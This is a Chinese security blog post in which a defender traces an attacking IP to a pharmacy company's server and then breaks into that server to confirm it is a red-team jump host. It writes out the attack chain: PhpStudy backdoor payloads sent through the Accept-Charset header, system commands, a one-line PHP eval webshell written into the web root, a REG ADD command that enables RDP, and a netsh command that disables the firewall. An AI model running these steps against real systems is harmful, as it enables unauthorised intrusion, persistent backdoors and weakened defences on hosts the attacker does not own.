# 实战 | 防守方溯源红队跳板

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUyMTA0MjQ4NA==&mid=2247538910&idx=1&sn=5f4862bb6e362ce00ed3405604e96a04&chksm=f9e33785ce94be9306e52f2146f9366e57d14d28b55ed62e10dd66cdf763abf4a1c4acb57d46&scene=126&sessionid=1681663027#rd](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247538910&idx=1&sn=5f4862bb6e362ce00ed3405604e96a04&chksm=f9e33785ce94be9306e52f2146f9366e57d14d28b55ed62e10dd66cdf763abf4a1c4acb57d46&scene=126&sessionid=1681663027#rd)

通过监测设备发现一个攻击IP，其资产为某药房企业，疑似为红队跳板，经过溯源，最终确定为该IP为红队跳板，感觉本次溯源有不少收获，且很有意思，因此将溯源过程记录下来。

1.首先访问其官网，发现服务器返回信息显示其使用了PHP/5.4.45，想到如果是利用PhpStudy工具，可能存在后门漏洞

![](../Images/86027665866cce416207f27777e23844.png)

2.查看之前的博客《PhpStudy后门漏洞》，构造payload,将Accept-Charset字段修改为base64加密的命令“phpinfo();”

![](../Images/e89584d9641d445fc9416e1ba85ec6cc.png)

3.根据结果看出确实存在PhpStudy解析漏洞，根据路径猜测其为Windows操作系统，执行base64加密的命令“echo system("net user");”

![](../Images/285a3eafaafd6584db392858e71ee87d.png)

4.探测网站根目录，执行base64加密的命令“echo system("dir");”

![](../Images/87b71a4e2f4b43dbbc277b551c589d30.png)

5.下载安装PhpStudy工具，发现网站根目录都为www目录

猜测目标根目录为“D:\\phpStudy\\WWW\\”，创建文件写入一句话木马，base64加密“$fp=fopen('D:\\phpStudy\\WWW\\index2.php',"w+");fputs($fp,'<?php eval($\_POST\[\\'index2\\'\]);?>');fclose($fp);”

![](../Images/8bfa1ddd45a1d608d4e94f49acb53d84.png)

6.用工具进行连接马文件

![](../Images/c8cb271700f5f5d533ffdc91dbf8a34a.png)

7.探测开放端口信息，未开启3389端口

![](../Images/711a4a8b149477c35368e1e718be9d55.png)

8.创建隐藏用户admin$发现已经被创建，可通过修改密码，开启3389端口，远程登录

PS：动作太大，不推荐，创建新用户后，远程连接新账号返回“远程登录时出现windows不能让您远程登录，因为不能加载您的配置文件”，才使用这种方法

开启3389端口：

REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f

关闭防火墙（操作系统版本从PHPinfo截图可知为Windows Server 2003）：

netsh firewall set opmode mode=disable

![](../Images/d995755dc2a2d17d28a3219f5ad256d0.png)

9.远程连接，确定为红队攻击跳板

![](../Images/19c281fe1157bd4c967e3d5e330abd9c.png)
